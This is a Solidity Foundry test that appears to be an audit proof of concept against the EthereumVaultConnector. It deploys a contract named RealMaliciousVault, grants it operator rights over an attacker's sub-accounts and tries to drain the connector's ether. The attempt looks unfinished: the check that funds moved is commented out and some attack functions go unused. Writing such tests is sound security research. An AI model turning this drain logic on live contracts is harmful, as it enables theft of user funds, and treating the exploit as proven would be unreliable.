// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../../src/EthereumVaultConnector.sol";

contract POC_Test is Test {
    event OperatorStatus(
        bytes19 indexed addressPrefix,
        address indexed operator,
        uint256 operatorBitField
    );
    event OwnerRegistered(bytes19 indexed addressPrefix, address indexed owner);

    EthereumVaultConnector internal evc;
    RealMaliciousVault attackerVaultContract;
    address attacker;

    function setUp() public {
        evc = new EthereumVaultConnector();
        attacker = makeAddr("attacker");
        attackerVaultContract = new RealMaliciousVault(evc);
        deal(address(evc), 1000e18);
    }

    function test_POC(uint256 operatorBitField) public {
        uint256 balanceEVC = address(evc).balance;
        assertEq(balanceEVC, 1000e18);
        
        vm.assume(operatorBitField > 0);

        bytes19 addressPrefix = evc.getAddressPrefix(attacker);
        assertEq(evc.getAccountOwner(attacker), address(0));
        assertEq(evc.getOperator(addressPrefix, address(attackerVaultContract)), 0);

        vm.expectEmit(true, true, false, false, address(evc));
        emit OwnerRegistered(addressPrefix, attacker);
        vm.expectEmit(true, true, false, true, address(evc));
        emit OperatorStatus(addressPrefix, address(attackerVaultContract), operatorBitField);
        vm.prank(attacker);
        evc.setOperator(addressPrefix, address(attackerVaultContract), operatorBitField);
        assertEq(evc.getOperator(addressPrefix, address(attackerVaultContract)), operatorBitField);

        for (uint256 i = 0; i < 256; ++i) {
            address account = address(uint160(uint160(attacker) ^ i));
            bool isAlreadyAuthorized = operatorBitField & (1 << i) != 0;
            assertEq(
                evc.isAccountOperatorAuthorized(account, address(attackerVaultContract)),
                isAlreadyAuthorized
            );

            // authorize the operator
            if (!isAlreadyAuthorized) {
                vm.prank(attacker);
                evc.setAccountOperator(account, address(attackerVaultContract), true);
            }
            assertEq(evc.isAccountOperatorAuthorized(account, address(attackerVaultContract)), true);
        }
        
        uint256 balanceBefore = address(attackerVaultContract).balance;
        assertTrue(balanceBefore == 0);

        console.log("Perform Attack...");
        vm.startPrank(attacker);
        //
        // 
        //
        evc.enableController(address(attacker), address(attackerVaultContract));
                evc.enableController(address(attacker), address(this));
        evc.enableCollateral(address(attacker), address(attackerVaultContract));
        //attackerVaultContract.prepare_attack(); 
        bytes memory data = abi.encodeWithSelector(RealMaliciousVault.EVCAuthenticateGovernor.selector);
        evc.call(address(attackerVaultContract), address(attacker), 0, data); // evc.controlCollateral(address(attackerVaultContract), address(attacker), type(uint256).max, "");
        
        uint256 balanceAfter = address(attackerVaultContract).balance;
      //  assertTrue(balanceBefore != balanceAfter);
        console.log("Malicious Vault Before:", balanceBefore, "Malicious Vault After:", balanceAfter);

    }

}

contract RealMaliciousVault {
    
    receive() external payable {}

    fallback() external payable {}

    EthereumVaultConnector internal evc;
    uint256 internal vaultStatusState;
    uint256 internal accountStatusState;

    constructor(EthereumVaultConnector _evc) {
        evc = _evc;
    }

    function prepare_attack() external {
        evc.enableController(msg.sender, address(this));

        evc.enableCollateral(msg.sender, address(this));
    }
 function EVCAuthenticateGovernor() public view virtual returns (address onBehalfOfAccount) {
        if (msg.sender == address(evc)) {
            (onBehalfOfAccount,) = evc.getCurrentOnBehalfOfAccount(address(0));

            if (
              evc.isOperatorAuthenticated()
                    || evc.isControlCollateralInProgress()
            ) {
                revert();
            }

            return onBehalfOfAccount;
    }
 }
    function Attack() external {
        evc.controlCollateral(address(this), msg.sender, type(uint256).max, "");
    }
 
    function checkVaultStatus()
        external
        virtual
        returns (bytes4 magicValue)
    {
       return 0x4b3d1223;
    }

    function checkAccountStatus(
        address,
        address[] memory
    ) external virtual returns (bytes4 magicValue) {
            return 0xb168c58f;
    }
}